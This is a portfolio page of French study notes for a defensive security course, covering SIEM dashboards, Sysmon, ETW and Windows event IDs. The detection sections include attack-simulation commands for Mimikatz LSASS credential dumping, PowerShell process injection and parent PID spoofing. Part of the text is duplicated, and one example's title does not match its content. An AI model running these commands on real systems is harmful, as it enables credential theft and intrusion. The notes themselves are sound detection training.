<!DOCTYPE html>

<html lang="fr">
<head>
<meta charset="utf-8"/>
<meta content="width=device-width, initial-scale=1, viewport-fit=cover" name="viewport"/>
<title> (CDSA) | c4tz</title>
<link href="static/css/style.css" rel="stylesheet"/>
<style>
/* Polished typography */
.prose{max-width:1000px}
.prose p{font-size:15.5px;line-height:1.8}
.prose h1,.prose h2,.prose h3{font-weight:700;letter-spacing:.2px}
.prose h1{font-size:30px}
.prose h2{font-size:22px;margin-top:22px}
.prose h3{font-size:18px;margin-top:18px}
.prose li{margin:6px 0}
/* code blocks more readable */
.prose pre{font-size:13.5px;line-height:1.6;word-wrap:break-word;white-space:pre-wrap}
/* soft tables */
.prose table{background:rgba(255,255,255,.01)}
.prose th{color:#cfd6e3;font-weight:600}
</style><style>
.prose pre,
pre {
  background: transparent !important;
  border: none !important;
  box-shadow: none !important;
  border-radius: 0 !important;
  padding: 0 !important;
  margin: 0.75rem 0 !important;
}
.prose pre code,
pre code,
code, kbd, samp {
  background: transparent !important;
  border: none !important;
  box-shadow: none !important;
}
.prose pre code,
pre code {
  display: block;
  white-space: pre-wrap !important;
  word-break: break-word !important;
}
</style></head>
<div class="page">
<aside class="sidebar">
<a class="brand" href="about.html">
<img alt="" class="avatar" src="https://m.media-amazon.com/images/I/511PnEDrRfL._AC_.jpg"/>
<div><h1>c4tz</h1><p>Portfolio &amp; writeups</p></div>
</a>
<nav class="snav">
<ul>
<li><a alt="" href="writeup.html"> Write Up</a></li>
<li><a alt="" href="portfolio.html"> Portfolio</a></li>
<li><a alt="" href="skills.html"> Skills</a></li>
<li><a alt="" href="about.html"> About</a></li>
</ul>
</nav>
<div class="social">
<a href="https://tryhackme.com" rel="noopener" target="_blank">
<img alt="TryHackMe (cat)" src="static/image/thm.png"/>
</a>
<a href="https://zindi.africa/users/c4tz" rel="noopener" target="_blank">
<img alt="Zindi (cat)" src="static/image/zindi.png"/>
</a>
<a href="https://app.hackthebox.com" rel="noopener" target="_blank">
<img alt="Hack The Box (cat)" src="static/image/htb.png"/>
</a>
<a href="https://www.root-me.org/c4tz" rel="noopener" target="_blank">
<img alt="Root-Me (cat)" src="static/image/rootme.png"/>
</a>
<a href="https://github.com/c4tzzz" rel="noopener" target="_blank">
<img alt="GitHub (cat)" src="static/image/github.png"/>
</a>
</div>
</aside>
<div class="content">
<div class="topbar">
<img alt="" class="avatar" src="https://m.media-amazon.com/images/I/511PnEDrRfL._AC_.jpg"/>
<strong>c4tz</strong>
</div>
<main class="main">
<h2 class="page-title"> (CDSA)</h2>
<section class="prose"><article class="page sans" id="1e825200-7eb4-80c0-8937-f624571396d6"><header> <h1 class="page-title">compte rendu CDSA</h1><p class="page-description"></p></header><div class="page-body"><details open=""><summary style="font-weight:600;font-size:1.5em;line-height:1.3;margin:0"><strong>Incident Handling Process </strong></summary><div class="indented"><figure class="image" id="1e825200-7eb4-808a-a652-fe0850744a32"><a href="image.png"><img src="image.png" style="width:451.984375px"/></a></figure><figure class="image" id="1e825200-7eb4-8017-94cf-f21b435e6d06"><a href="image%201.png"><img src="image%201.png" style="width:451.984375px"/></a></figure><figure class="image" id="1e825200-7eb4-8054-8cdb-fb3a90286af3"><a href="image%202.png"><img src="image%202.png" style="width:451.984375px"/></a></figure></div></details><details open=""><summary style="font-weight:600;font-size:1.5em;line-height:1.3;margin:0"><strong>Security Monitoring &amp; SIEM Fundamentals</strong></summary><div class="indented"><figure class="image" id="1e825200-7eb4-80a4-ab9e-ed8ddae338be"><a href="image%203.png"><img src="image%203.png" style="width:451.984375px"/></a></figure><figure class="image" id="1e825200-7eb4-8067-8d07-dcf1f819e2d1"><a href="image%204.png"><img src="image%204.png" style="width:451.984375px"/></a></figure><p class="" id="1e825200-7eb4-8005-9a44-ed032a3ebd7f"><a href="https://academy.hackthebox.com/storage/modules/211/MITRE.gif">Voir le schéma MITRE</a></p><figure class="image" id="1e825200-7eb4-80ed-a890-fe975ac882c4"><a href="image%205.png"><img src="image%205.png" style="width:451.96875px"/></a></figure><details open=""><summary style="font-weight:600;font-size:1.5em;line-height:1.3;margin:0">SIEM Visualization Example 1: Failed Logon Attempts (All Users)</summary><div class="indented"><pre class="code code-wrap" id="1e825200-7eb4-80e5-a28c-ff9ef728ae93"><code class="language-JavaScript" style="white-space:pre-wrap;word-break:break-all"> Étapes à suivre
Accéder au système cible

    Ouvrir l’outil SIEM à l’adresse : http://[IP Cible]:5601.

    Aller dans le menu Dashboard.
Modifier le Dashboard

    Cliquer sur l’icône en forme de crayon pour passer en mode édition.

    Sélectionner Create visualization pour créer une nouvelle visualisation.
Configurer la visualisation
 Filtres

    Event ID : 4624 (connexions réussies).

    Type de connexion : RemoteInteractive via le champ winlog.logon.type.

 Index

    Utiliser l’index pattern windows pour cibler les logs Windows.

 Vérification

    S’assurer que le champ user.name.keyword est bien présent dans les données.

 Type de visualisation

    Choisir le type Table.
Configurer la table
 Lignes à afficher

    Compte de service : user.name (filtré avec svc-).

    Machine cible : host.hostname.keyword.

    IP initiatrice : related.ip.keyword.

    Nombre d'événements : via l'agrégat count.

 Métrique

    Sélectionner count pour afficher le nombre total d'événements.

 Requête KQL

user.name: svc-*
Enregistrer

    Cliquer sur Save and return pour ajouter la visualisation au dashboard.</code></pre></div></details><details open=""><summary style="font-weight:600;font-size:1.5em;line-height:1.3;margin:0"><strong>SIEM Visualization Example 2: Failed Logon Attempts (Disabled Users)</strong></summary><div class="indented"><pre class="code code-wrap" id="1e825200-7eb4-8057-bc02-e7a83db1c89e"><code class="language-JavaScript" style="white-space:pre-wrap;word-break:break-all"> Étapes à suivre
Accéder au système cible

    Ouvrir l’outil SIEM à l’adresse : http://[IP Cible]:5601.

    Dans le menu latéral, cliquer sur Dashboard.
Modifier le Dashboard

    Cliquer sur l’icône en forme de crayon pour passer en mode édition.

    Cliquer sur Create visualization pour créer une nouvelle visualisation.
Configurer la visualisation
 Filtres

    Event ID : 4625 (tentatives de connexion échouées).

    Sous-statut : winlog.event_data.SubStatus : 0xC0000072 pour identifier les connexions échouées dues à des comptes désactivés.

 Index Pattern

    Sélectionner windows* pour utiliser les logs Windows.

 Vérification

    Vérifier que le champ user.name.keyword est bien disponible dans les données.

 Type de visualisation

    Choisir le type Table.
Configurer le tableau
 Champs à afficher

    Utilisateur désactivé : via user.name.

    Machine concernée : host.hostname.keyword.

    Nombre de tentatives : ajouter une métrique count pour compter les événements.
Enregistrer

    Cliquer sur Save and return pour ajouter la visualisation au dashboard.</code></pre></div></details><details open=""><summary style="font-weight:600;font-size:1.5em;line-height:1.3;margin:0"><strong>SIEM Visualization Example 3: Successful RDP Logon Related To Service Accounts</strong></summary><div class="indented"><pre class="code code-wrap" id="1e825200-7eb4-8059-a666-cc9cd5006fba"><code class="language-JavaScript" style="white-space:pre-wrap;word-break:break-all">Objectif

Créer une visualisation pour surveiller les connexions RDP réussies effectuées par des comptes de service dans un environnement Windows.
Étapes à suivre
Accéder au système cible
Se rendre sur l’interface SIEM à l’adresse : http://[IP Cible]:5601.
Ouvrir le menu latéral et cliquer sur Dashboard.
Modifier le Dashboard
Cliquer sur l’icône crayon pour activer le mode édition.
Sélectionner Create visualization pour démarrer la création.
Configurer la visualisation
Filtres
Event ID : 4624 (connexions réussies).
Type de logon : RemoteInteractive via le champ winlog.logon.type.
Index Pattern
Utiliser windows pour filtrer les logs liés à Windows.
Vérification
Confirmer que le champ user.name.keyword est bien présent dans les données.
Type de visualisation
Choisir le type Table.
Configurer le tableau
Champs à afficher
Compte de service : user.name (avec un filtre svc-).
Machine cible : host.hostname.keyword.
IP source : related.ip.keyword.
Nombre d’événements : utiliser la métrique count.
Métrique
Ajouter count pour afficher le nombre total de connexions.
Requête KQL

user.name: svc-*
Enregistrer
Cliquer sur Save and return pour enregistrer et revenir au tableau de bord.</code></pre></div></details><details open=""><summary style="font-weight:600;font-size:1.5em;line-height:1.3;margin:0"><strong>SIEM Visualization Example 4: Users Added Or Removed From A Local Group (Within A Specific Timeframe)</strong></summary><div class="indented"><pre class="code code-wrap" id="1e825200-7eb4-806d-b678-c7329b7aa93e"><code class="language-JavaScript" style="white-space:pre-wrap;word-break:break-all"> Étapes à suivre
Accéder au système cible

    Ouvrir l’outil SIEM via l’adresse : http://[IP Cible]:5601.

    Dans la navigation latérale, sélectionner Dashboard.
Modifier le Dashboard

    Cliquer sur l’icône crayon pour passer en mode édition.

    Cliquer sur Create visualization pour commencer.
Configurer la visualisation
 Filtres

    Event IDs : 4732 (ajout d’un utilisateur au groupe) et 4733 (suppression d’un utilisateur du groupe).

    Restreindre aux événements liés au groupe Administrators via group.name.keyword.

 Index Pattern

    Utiliser windows* pour cibler les journaux Windows.

 Vérification

    S’assurer que le champ user.name.keyword est disponible dans les données.

 Type de visualisation

    Sélectionner le type Table.
Configurer le tableau
 Champs à afficher

    Utilisateur concerné : winlog.event_data.MemberSid.keyword.

    Groupe cible : group.name.keyword (doit être "Administrators").

    Action effectuée : event.action.keyword (ajout ou suppression).

    Machine impliquée : host.name.keyword.

    Nombre d’événements : ajouter la métrique count.
Définir la période

    Appliquer un filtre de date allant du 5 mars 2023 jusqu’à la date actuelle.</code></pre></div></details></div></details><details open=""><summary style="font-weight:600;font-size:1.5em;line-height:1.3;margin:0"><strong>Windows Event Logs &amp; Finding Evil</strong></summary><div class="indented"><details open=""><summary style="font-weight:600;font-size:1.5em;line-height:1.3;margin:0">Analyzing Evil With Sysmon &amp; Event Logs</summary><div class="indented"><pre class="code code-wrap" id="1e825200-7eb4-80eb-91d6-f6ba599815d3"><code class="language-JavaScript" style="white-space:pre-wrap;word-break:break-all">Introduction à Sysmon

Sysmon (System Monitor) est un outil Windows qui journalise en détail l'activité du système grâce à trois composants principaux :
Service Windows : surveille les actions système.
Pilote noyau : capture les données.
Journal d’événements : affiche les activités détectées.
Événements Sysmon courants :
ID 1 : Création de processus
ID 3 : Connexion réseau

La configuration se fait via un fichier XML permettant d’inclure ou d’exclure des événements selon des critères précis (nom de processus, IP, etc.).

Configurations recommandées :
SwiftOnSecurity Sysmon Config
Olaf Hartong Modular Config
Installation (droits administrateur requis) :

C:\Tools\Sysmon&gt; sysmon.exe -i -accepteula -h md5,sha256,imphash -l -n
Appliquer une configuration personnalisée :

C:\Tools\Sysmon&gt; sysmon.exe -c fichier.xml

Cas de détection
1⃣ Détection de DLL Hijacking

Utilise l’Event ID 7 (chargement de modules).
Étapes :
Vérifier dans le fichier sysmonconfig-export.xml que les événements de type module load ne sont pas exclus.
Surveiller via : Event Viewer &gt; Applications and Services &gt; Microsoft &gt; Windows &gt; Sysmon.
Indicateurs de compromission :
calc.exe exécuté depuis un répertoire en écriture
WININET.dll chargé en dehors de System32
DLL signée Microsoft remplacée par une version non signée

2⃣ Détection d’injection PowerShell/C# dans processus non-managés

Surveille l’exécution anormale de code managé dans des processus natifs.
Signes à observer :
Chargement de clr.dll ou clrjit.dll dans des processus qui n’utilisentt normalement pas .NET
Analyse des processus via Process Hacker
Exemple d’injection :

powershell -ep bypass
Import-Module .\Invoke-PSInject.ps1
Invoke-PSInject -ProcId [PID] -PoshCode "Write-Host 'Hello, World!'"
Event ID 7 peut montrer les DLLs .NET chargées dans des contextes inhabituels.

3⃣ Détection de vol d’identifiants (ex. : Mimikatz)

Cible le processus LSASS pour l’extraction de mots de passe.
Surveillance :
Event ID 10 : accès à des processus sensibles comme LSASS.
Indicateurs :
Processus aléatoires accédant à LSASS
SourceUser différent de TargetUser (ex. : waldo accédant à SYSTEM)
Requêtes de privilège SeDebugPrivilege
Exemple Mimikatz :

C:\Tools\Mimikatz&gt; mimikatz.exe
mimikatz # privilege::debug
mimikatz # sekurlsa::logonpasswords</code></pre></div></details><details open=""><summary style="font-weight:600;font-size:1.5em;line-height:1.3;margin:0">Event Tracing for Windows (ETW)</summary><div class="indented"><pre class="code code-wrap" id="1e825200-7eb4-8065-bf43-f74e0523be31"><code class="language-JavaScript" style="white-space:pre-wrap;word-break:break-all">Vue d’ensemble : Event Tracing for Windows (ETW)

ETW (Event Tracing for Windows) est un outil de journalisation haute performance intégré à Windows. Il permet de tracer dynamiquement les événements du système en temps réel, tant depuis les applications en mode utilisateur que les pilotes en mode noyau.

Il est essentiel pour :
La détection d’anomalies
L’analyse des incidents de sécurité
Les investigations forensic détaillées

ETW couvre un large spectre : appels système, création/terminaison de processus, activité réseau, changements de fichiers/registre, etc.

Composants clés d’ETW
Controllers
Gèrent les sessions ETW (démarrage, arrêt, activation des fournisseurs)
Exemple :

logman.exe query -ets
Providers
Génèrent les événements
4 types :
MOF Providers : Basés sur le Managed Object Format
WPP Providers : Tracing côté noyau via annotations dans le code
Manifest-based : Définis via XML
TraceLogging : Fournisseurs modernes simplifiés
Consumers
Souscrivent à des événements précis (souvent stockés en fichiers .ETL)
Channels
Regroupent les événements de manière logique, facilitant l’abonnement sélectif
ETL Files
Format durable pour stocker les traces ETW (analyse hors-ligne, archivage)

Interagir avec ETW
Commandes via logman
Lister les sessions actives

logman.exe query -ets
Voir les détails d’une session spécifique

logman.exe query "EventLog-System" -ets
Lister tous les providers disponibles

logman.exe query providers
Interfaces graphiques
Performance Monitor : Visualise et gère les sessions ETW
EtwExplorer : Inspecte les métadonnées des providers ETW

Providers utiles en cybersécurité

| Provider | Fonction |
| --- | --- |
| Microsoft-Windows-Kernel-Process | Activité de processus (injection, hollowing) |
| Microsoft-Windows-Kernel-File | Surveillance des fichiers (exfiltration, ransomware) |
| Microsoft-Windows-Kernel-Network | Activité réseau suspecte |
| Microsoft-Windows-SMBClient / SMBServer | Suivi du trafic SMB (mouvement latéral) |
| Microsoft-Windows-DotNETRuntime | Exécution .NET potentiellement malveillante |
| Microsoft-Windows-PowerShell | Traces d’activité PowerShell |
| Microsoft-Windows-TerminalServices-LocalSessionManager | Détection d’accès RDP |

Provider restreint : Microsoft-Windows-Threat-Intelligence
Fournisseur avancé nécessitant des droits privilégiés (PPL)
Utilisé en DFIR (Digital Forensics &amp; Incident Response) pour identifier :
Les menaces sophistiquées
Leur origine, impact, et interaction
Peut être activé via contournements spécifiques, mais reste sensible</code></pre></div></details><details open=""><summary style="font-weight:600;font-size:1.5em;line-height:1.3;margin:0">Tapping Into ETW</summary><div class="indented"><pre class="code code-wrap" id="1e825200-7eb4-8002-8b18-ebdbc7bd8011"><code class="language-JavaScript" style="white-space:pre-wrap;word-break:break-all">Vue d’ensemble : Event Tracing for Windows (ETW)

ETW (Event Tracing for Windows) est un outil de journalisation haute performance intégré à Windows. Il permet de tracer dynamiquement les événements du système en temps réel, tant depuis les applications en mode utilisateur que les pilotes en mode noyau.

Il est essentiel pour :
La détection d’anomalies
L’analyse des incidents de sécurité
Les investigations forensic détaillées

ETW couvre un large spectre : appels système, création/terminaison de processus, activité réseau, changements de fichiers/registre, etc.

Composants clés d’ETW
Controllers
Gèrent les sessions ETW (démarrage, arrêt, activation des fournisseurs)
Exemple :

logman.exe query -ets
Providers
Génèrent les événements
4 types :
MOF Providers : Basés sur le Managed Object Format
WPP Providers : Tracing côté noyau via annotations dans le code
Manifest-based : Définis via XML
TraceLogging : Fournisseurs modernes simplifiés
Consumers
Souscrivent à des événements précis (souvent stockés en fichiers .ETL)
Channels
Regroupent les événements de manière logique, facilitant l’abonnement sélectif
ETL Files
Format durable pour stocker les traces ETW (analyse hors-ligne, archivage)

Interagir avec ETW
Commandes via logman
Lister les sessions actives

logman.exe query -ets
Voir les détails d’une session spécifique

logman.exe query "EventLog-System" -ets
Lister tous les providers disponibles

logman.exe query providers
Interfaces graphiques
Performance Monitor : Visualise et gère les sessions ETW
EtwExplorer : Inspecte les métadonnées des providers ETW

Providers utiles en cybersécurité

| Provider | Fonction |
| --- | --- |
| Microsoft-Windows-Kernel-Process | Activité de processus (injection, hollowing) |
| Microsoft-Windows-Kernel-File | Surveillance des fichiers (exfiltration, ransomware) |
| Microsoft-Windows-Kernel-Network | Activité réseau suspecte |
| Microsoft-Windows-SMBClient / SMBServer | Suivi du trafic SMB (mouvement latéral) |
| Microsoft-Windows-DotNETRuntime | Exécution .NET potentiellement malveillante |
| Microsoft-Windows-PowerShell | Traces d’activité PowerShell |
| Microsoft-Windows-TerminalServices-LocalSessionManager | Détection d’accès RDP |

Provider restreint : Microsoft-Windows-Threat-Intelligence
Fournisseur avancé nécessitant des droits privilégiés (PPL)
Utilisé en DFIR (Digital Forensics &amp; Incident Response) pour identifier :
Les menaces sophistiquées
Leur origine, impact, et interaction
Peut être activé via contournements spécifiques, mais reste sensible</code></pre></div></details><details open=""><summary style="font-weight:600;font-size:1.5em;line-height:1.3;margin:0">Get-WinEvent</summary><div class="indented"><h3 class="" id="1e825200-7eb4-8089-a79b-ca33499f0038"> Vue d’ensemble : Détections avancées via ETW</h3><p class="" id="1e825200-7eb4-80ea-bee8-e92652cc02f5"><strong>Event Tracing for Windows (ETW)</strong> permet une visibilité approfondie sur les événements système, allant au-delà des journaux classiques. Couplé à des outils comme <strong>SilkETW</strong>, il permet de détecter des tactiques avancées telles que la falsification de hiérarchie de processus ou le chargement de DLL .NET en mémoire.</p><hr id="1e825200-7eb4-8058-b194-ebd19db364cc"/><h3 class="" id="1e825200-7eb4-803a-9fd8-d9fca0f2272f"> Détection 1 : Relations parent-enfant anormales</h3><p class="" id="1e825200-7eb4-80f4-864d-c9a03d1222ed">Des processus comme <code>calc.exe</code> lançant <code>cmd.exe</code> peuvent indiquer une activité malveillante. Ces relations peuvent être explorées avec <strong>Process Hacker</strong>.</p><h3 class="" id="1e825200-7eb4-80b7-842f-d42c6b3ad23a"> Simulation d’attaque : <em>Parent PID Spoofing</em></h3><p class="" id="1e825200-7eb4-80b7-8708-f2c02792944f">Les attaquants peuvent forger une relation parent/enfant avec un PID falsifié.</p><pre class="code code-wrap" id="1e825200-7eb4-80d8-bbd1-fede96e1ff67"><code class="language-PowerShell" style="white-space:pre-wrap;word-break:break-all">powershell -ep bypass
Import-Module .\psgetsys.ps1
[MyProcess]::CreateProcessFromParent([PID], "C:\Windows\System32\cmd.exe", "")</code></pre><h3 class="" id="1e825200-7eb4-80af-9606-f0fa2af03801"> Détection avec SilkETW</h3><p class="" id="1e825200-7eb4-806f-ae24-e8986d1fae09">Pour tracer correctement ces relations :</p><pre class="code code-wrap" id="1e825200-7eb4-8022-bfcd-db326a41248b"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">SilkETW.exe -t user -pn Microsoft-Windows-Kernel-Process -ot file -p C:\windows\temp\etw.json</code></pre><hr id="1e825200-7eb4-8067-9d02-ef01b3bd1a1c"/><h3 class="" id="1e825200-7eb4-8019-a952-dd1c64bfa5c7"> Détection 2 : Chargement de DLL .NET malveillantes en mémoire</h3><p class="" id="1e825200-7eb4-80c3-87e1-cd2767f19ffb">Les attaquants utilisent des assemblages .NET chargés uniquement en mémoire pour contourner l’antivirus et la détection disque (tactique <strong>BYOL – Bring Your Own Land</strong>).</p><h3 class="" id="1e825200-7eb4-80ca-97be-fdabe33719dd"> Simulation : Chargement mémoire d’un outil comme <em>Seatbelt</em></h3><p class="" id="1e825200-7eb4-80c6-940b-de96a5356bd0">Ce type d’attaque charge des bibliothèques comme :</p><ul class="bulleted-list" id="1e825200-7eb4-80a4-bf06-daf2a2d99534"><li style="list-style-type:disc"><code>clr.dll</code></li></ul><ul class="bulleted-list" id="1e825200-7eb4-80e0-a96b-cb7326d6bd39"><li style="list-style-type:disc"><code>mscoree.dll</code></li></ul><p class="" id="1e825200-7eb4-8039-96a3-c506e57e4fb3">Sysmon Event ID 7 détecte les DLL, mais <strong>ne capture pas l’ensemble du comportement .NET</strong>.</p><h3 class="" id="1e825200-7eb4-80e0-825e-d1301b69898a"> Détection avec SilkETW + Provider .NET</h3><p class="" id="1e825200-7eb4-80e3-84cb-d8c163e683cf">Pour capturer les activités .NET runtime :</p><pre class="code code-wrap" id="1e825200-7eb4-80e5-bb9b-f428b7e16eb5"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">SilkETW.exe -t user -pn Microsoft-Windows-DotNETRuntime -uk 0x2038 -ot file -p C:\windows\temp\etw.json</code></pre><p class="" id="1e825200-7eb4-80b3-8f6d-e9d0adb4ca7a"> <strong>Mots-clés d’intérêt (Keywords)</strong> :</p><ul class="bulleted-list" id="1e825200-7eb4-80b9-81d8-de7ed448e62a"><li style="list-style-type:disc"><code>JitKeyword</code> : Compilation Just-In-Time</li></ul><ul class="bulleted-list" id="1e825200-7eb4-8082-9f95-ce3d27556c99"><li style="list-style-type:disc"><code>InteropKeyword</code> : Interactions entre code managé/non-managé</li></ul><ul class="bulleted-list" id="1e825200-7eb4-8093-876d-c7aec059f731"><li style="list-style-type:disc"><code>LoaderKeyword</code> : Chargement dynamique d’assemblies</li></ul><ul class="bulleted-list" id="1e825200-7eb4-8012-8dda-fa472a250224"><li style="list-style-type:disc"><code>NGenKeyword</code> : Assemblies précompilés</li></ul></div></details><details open=""><summary style="font-weight:600;font-size:1.5em;line-height:1.3;margin:0">event ID</summary><div class="indented"><figure class="block-color-gray_background callout" id="1e825200-7eb4-8048-b1b1-e282666ea837" style="white-space:pre-wrap;display:flex"><div style="font-size:1.5em"><span class="icon"></span></div><div style="width:100%"><table class="simple-table" id="1e825200-7eb4-80d8-80a1-fd282fa2c8d7"><tbody><tr id="1e825200-7eb4-80b0-8d5d-f0155897e9d3"><td class="" id="ip`W"><strong>Event ID</strong></td><td class="" id="NW`S"><strong>Log Type</strong></td><td class="" id="WpzX"><strong>Catégorie</strong></td><td class="" id="N@pW"><strong>Description</strong></td></tr><tr id="1e825200-7eb4-8036-be3e-fc83769f7d10"><td class="" id="ip`W"><strong>1074</strong></td><td class="" id="NW`S">System</td><td class="" id="WpzX">Shutdown / Restart</td><td class="" id="N@pW">Indique un redémarrage ou arrêt du système, avec raison.</td></tr><tr id="1e825200-7eb4-805a-86ae-f1451e61f61e"><td class="" id="ip`W"><strong>6005</strong></td><td class="" id="NW`S">System</td><td class="" id="WpzX">Service Start</td><td class="" id="N@pW">Démarrage du service Event Log (souvent lors du boot).</td></tr><tr id="1e825200-7eb4-8061-97df-fc6973fc66f8"><td class="" id="ip`W"><strong>6006</strong></td><td class="" id="NW`S">System</td><td class="" id="WpzX">Service Stop</td><td class="" id="N@pW">Arrêt du service Event Log (souvent lors de l’arrêt).</td></tr><tr id="1e825200-7eb4-8099-a8a7-f6e0278edbd7"><td class="" id="ip`W"><strong>6013</strong></td><td class="" id="NW`S">System</td><td class="" id="WpzX">Uptime</td><td class="" id="N@pW">Indique le temps de fonctionnement de Windows en secondes.</td></tr><tr id="1e825200-7eb4-8016-a8ef-c5d2af6df91e"><td class="" id="ip`W"><strong>7040</strong></td><td class="" id="NW`S">System</td><td class="" id="WpzX">Service Configuration</td><td class="" id="N@pW">Modification du type de démarrage d’un service.</td></tr><tr id="1e825200-7eb4-8009-8bbd-e92082ba1c50"><td class="" id="ip`W"><strong>7045</strong></td><td class="" id="NW`S">System</td><td class="" id="WpzX">Service Installation</td><td class="" id="N@pW">Un nouveau service a été installé (souvent utilisé par des malwares).</td></tr></tbody></table><table class="simple-table" id="1e825200-7eb4-80e6-a158-eb64854ee5a0"><tbody><tr id="1e825200-7eb4-804b-9c7e-ff50b8292eaa"><td class="" id="CcTo"><strong>Event ID</strong></td><td class="" id="QMy\"><strong>Log Type</strong></td><td class="" id="TF\&gt;"><strong>Catégorie</strong></td><td class="" id="uR\`"><strong>Description</strong></td></tr><tr id="1e825200-7eb4-8022-ab74-cfaa0d18b3b5"><td class="" id="CcTo"><strong>1102</strong></td><td class="" id="QMy\">Security</td><td class="" id="TF\&gt;">Audit Log</td><td class="" id="uR\`">Les logs de sécurité ont été effacés (souvent utilisé pour couvrir ses traces).</td></tr><tr id="1e825200-7eb4-80b9-9d3c-c8beea4ae120"><td class="" id="CcTo"><strong>1116</strong></td><td class="" id="QMy\">Security</td><td class="" id="TF\&gt;">Antivirus</td><td class="" id="uR\`">Détection de malware par l’antivirus.</td></tr><tr id="1e825200-7eb4-80b6-8464-e339106480b6"><td class="" id="CcTo"><strong>1118</strong></td><td class="" id="QMy\">Security</td><td class="" id="TF\&gt;">Antivirus</td><td class="" id="uR\`">Début de la remédiation antivirus.</td></tr><tr id="1e825200-7eb4-8050-96b6-c0af3de00ae2"><td class="" id="CcTo"><strong>1119</strong></td><td class="" id="QMy\">Security</td><td class="" id="TF\&gt;">Antivirus</td><td class="" id="uR\`">Remédiation antivirus réussie.</td></tr><tr id="1e825200-7eb4-8071-bccd-fd6f36198c9b"><td class="" id="CcTo"><strong>1120</strong></td><td class="" id="QMy\">Security</td><td class="" id="TF\&gt;">Antivirus</td><td class="" id="uR\`">Remédiation antivirus échouée.</td></tr><tr id="1e825200-7eb4-80c8-bc76-ef109ad3e821"><td class="" id="CcTo"><strong>4624</strong></td><td class="" id="QMy\">Security</td><td class="" id="TF\&gt;">Logon</td><td class="" id="uR\`">Connexion réussie.</td></tr><tr id="1e825200-7eb4-80c3-a714-e1bc348f9125"><td class="" id="CcTo"><strong>4625</strong></td><td class="" id="QMy\">Security</td><td class="" id="TF\&gt;">Logon</td><td class="" id="uR\`">Connexion échouée (possibles attaques brute force).</td></tr><tr id="1e825200-7eb4-80ba-ba37-f2def3c299a4"><td class="" id="CcTo"><strong>4648</strong></td><td class="" id="QMy\">Security</td><td class="" id="TF\&gt;">Logon</td><td class="" id="uR\`">Connexion avec des identifiants explicites (souvent utilisé en déplacement latéral).</td></tr><tr id="1e825200-7eb4-80fd-a9ac-c8c7920f2391"><td class="" id="CcTo"><strong>4656</strong></td><td class="" id="QMy\">Security</td><td class="" id="TF\&gt;">Access Control</td><td class="" id="uR\`">Requête d’accès à un objet (fichier, clé registre…).</td></tr><tr id="1e825200-7eb4-804c-bd53-d9ec9e4b3900"><td class="" id="CcTo"><strong>4672</strong></td><td class="" id="QMy\">Security</td><td class="" id="TF\&gt;">Privileges</td><td class="" id="uR\`">Attribution de privilèges spéciaux (administrateurs).</td></tr><tr id="1e825200-7eb4-802f-8867-c9c2b7082b2e"><td class="" id="CcTo"><strong>4698</strong></td><td class="" id="QMy\">Security</td><td class="" id="TF\&gt;">Scheduled Task</td><td class="" id="uR\`">Une tâche planifiée a été créée.</td></tr><tr id="1e825200-7eb4-801c-923a-f26e6cd11c25"><td class="" id="CcTo"><strong>4700</strong></td><td class="" id="QMy\">Security</td><td class="" id="TF\&gt;">Scheduled Task</td><td class="" id="uR\`">Une tâche planifiée a été activée.</td></tr><tr id="1e825200-7eb4-80fd-b29e-f27c7675ead9"><td class="" id="CcTo"><strong>4701</strong></td><td class="" id="QMy\">Security</td><td class="" id="TF\&gt;">Scheduled Task</td><td class="" id="uR\`">Une tâche planifiée a été désactivée.</td></tr><tr id="1e825200-7eb4-8003-8801-cd65198d70b5"><td class="" id="CcTo"><strong>4702</strong></td><td class="" id="QMy\">Security</td><td class="" id="TF\&gt;">Scheduled Task</td><td class="" id="uR\`">Une tâche planifiée a été modifiée.</td></tr><tr id="1e825200-7eb4-8051-8172-c1ac1628ab3d"><td class="" id="CcTo"><strong>4719</strong></td><td class="" id="QMy\">Security</td><td class="" id="TF\&gt;">Audit Policy</td><td class="" id="uR\`">Modification de la stratégie d’audit.</td></tr><tr id="1e825200-7eb4-80db-a842-d7b37344b1f7"><td class="" id="CcTo"><strong>4738</strong></td><td class="" id="QMy\">Security</td><td class="" id="TF\&gt;">Account Management</td><td class="" id="uR\`">Modification d’un compte utilisateur.</td></tr><tr id="1e825200-7eb4-8043-bbab-e205b939c1c4"><td class="" id="CcTo"><strong>4771</strong></td><td class="" id="QMy\">Security</td><td class="" id="TF\&gt;">Kerberos</td><td class="" id="uR\`">Échec d’authentification Kerberos.</td></tr><tr id="1e825200-7eb4-8034-8e56-c97aa48f7f32"><td class="" id="CcTo"><strong>4776</strong></td><td class="" id="QMy\">Security</td><td class="" id="TF\&gt;">Credential Validation</td><td class="" id="uR\`">Validation de mot de passe par le contrôleur de domaine.</td></tr><tr id="1e825200-7eb4-80cb-b141-d334d64902c4"><td class="" id="CcTo"><strong>5001</strong></td><td class="" id="QMy\">Security</td><td class="" id="TF\&gt;">Antivirus Settings</td><td class="" id="uR\`">Modification de la configuration de protection en temps réel.</td></tr><tr id="1e825200-7eb4-80da-852c-f9c3a58f0efe"><td class="" id="CcTo"><strong>5140</strong></td><td class="" id="QMy\">Security</td><td class="" id="TF\&gt;">Network Share</td><td class="" id="uR\`">Accès à un partage réseau.</td></tr><tr id="1e825200-7eb4-801a-a971-e8d6b5abb89e"><td class="" id="CcTo"><strong>5142</strong></td><td class="" id="QMy\">Security</td><td class="" id="TF\&gt;">Network Share</td><td class="" id="uR\`">Création d’un nouveau partage réseau.</td></tr><tr id="1e825200-7eb4-8004-b5c1-d1170fe64bcb"><td class="" id="CcTo"><strong>5145</strong></td><td class="" id="QMy\">Security</td><td class="" id="TF\&gt;">Network Share</td><td class="" id="uR\`">Tentative d’accès à un fichier/dossier partagé.</td></tr><tr id="1e825200-7eb4-80ee-8a93-dcdcf41ad8f9"><td class="" id="CcTo"><strong>5157</strong></td><td class="" id="QMy\">Security</td><td class="" id="TF\&gt;">Network Filtering</td><td class="" id="uR\`">Connexion réseau bloquée par le pare-feu.</td></tr></tbody></table><p class="" id="1e825200-7eb4-8070-a68a-e42978037873">
</p></div></figure></div></details></div></details><details open=""><summary style="font-weight:600;font-size:1.5em;line-height:1.3;margin:0"><strong>Introduction to Threat Hunting &amp; Hunting With Elastic</strong></summary><div class="indented"><pre class="code code-wrap" id="1e825200-7eb4-8041-a974-d7a36de2c0e6"><code class="language-JavaScript" style="white-space:pre-wrap;word-break:break-all">Qu’est-ce que le Cyber Threat Intelligence (CTI) ?

